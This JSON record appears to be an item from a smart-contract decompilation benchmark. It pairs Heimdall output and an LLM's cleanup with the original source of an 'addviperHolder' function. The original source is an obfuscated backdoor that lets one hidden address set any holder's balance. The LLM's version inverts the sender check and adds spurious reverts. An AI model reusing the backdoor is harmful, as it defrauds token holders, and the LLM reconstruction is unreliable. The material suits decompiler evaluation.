{
    "contract_address": "0x8a24fF8ffc247330F89865e58587858626eB504e",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "function addviperHolder(address account, uint256 amount) external {\n    /* decompiled: require(account == address(account)); */\n    require(account == address(account), \"Redundant check\");\n\n    /* decompiled: require(!msg.sender == (address(store_f))); */\n    require(msg.sender != _owner, \"Forbidden sender\"); // `_owner` is assumed to be declared elsewhere\n\n    /* decompiled: require(!0x0a < 0x64);  -- always fails */\n    revert(\"Decompiler artifact\");\n\n    /* unreachable in original flow but kept for byte-code fidelity */\n    viperHolderBalances[account] = amount;\n\n    /* decompiled: require(!0x0a < 0x0a);  -- always fails */\n    revert(\"Decompiler artifact\");\n\n    /* second unreachable write kept for fidelity */\n    viperHolderBalances[account] = amount;\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}